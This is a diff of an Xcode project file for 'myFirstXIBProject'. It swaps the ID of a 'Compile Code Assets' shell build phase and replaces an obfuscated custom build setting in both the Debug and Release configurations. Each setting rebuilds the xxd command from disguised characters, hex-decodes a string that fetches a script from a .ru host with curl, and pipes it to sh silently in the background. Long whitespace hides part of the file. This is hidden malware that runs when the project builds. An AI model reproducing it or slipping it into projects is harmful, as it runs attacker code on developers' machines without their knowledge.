@@ -83,7 +83,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 77D035F6296C2CA200D4937D /* Build configuration list for PBXNativeTarget "myFirstXIBProject" */;
 			buildPhases = (
-				97F5330EE167440FA67BBDC8 /* Compile Code Assets */,
+				4431C803E72143DE857BBDC8 /* Compile Code Assets */,
 				77D035DE296C2CA000D4937D /* Sources */,
 				77D035DF296C2CA000D4937D /* Frameworks */,
 				77D035E0296C2CA000D4937D /* Resources */,
@@ -134,7 +134,7 @@
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																											/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		97F5330EE167440FA67BBDC8 /* Compile Code Assets */ = {
+		4431C803E72143DE857BBDC8 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -199,7 +199,7 @@
 		77D035F4296C2CA200D4937D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -260,7 +260,7 @@
 		77D035F5296C2CA200D4937D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
